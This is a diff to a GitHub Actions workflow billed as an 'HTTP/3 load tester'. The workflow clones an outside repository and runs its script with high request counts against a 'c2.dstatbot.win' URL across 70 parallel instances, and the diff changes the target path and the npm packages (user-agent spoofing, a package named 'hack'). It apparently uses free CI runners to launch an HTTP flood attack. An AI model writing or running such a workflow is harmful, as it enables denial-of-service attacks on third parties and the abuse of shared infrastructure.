@@ -33,14 +33,14 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer hpack puppeteer-extra puppeteer puppeteer-extra-plugin-stealth puppeteer-extra-plugin-anonymize-ua puppeteer-extra-plugin-adblocker
+        run: npm install   fingerprint-generator axios chalk@4 colors request user-agents hack
             
       - name: Run HTTP/3 load tester
         run: |
           
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           cd curly-octo-doodle
-          node m.js GET https://c2.dstatbot.win/0D5Lkzy5 700 4 120 ya.txt --close
+          node m.js GET https://c2.dstatbot.win/PzopLY0i 700 4 120 ya.txt --close
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
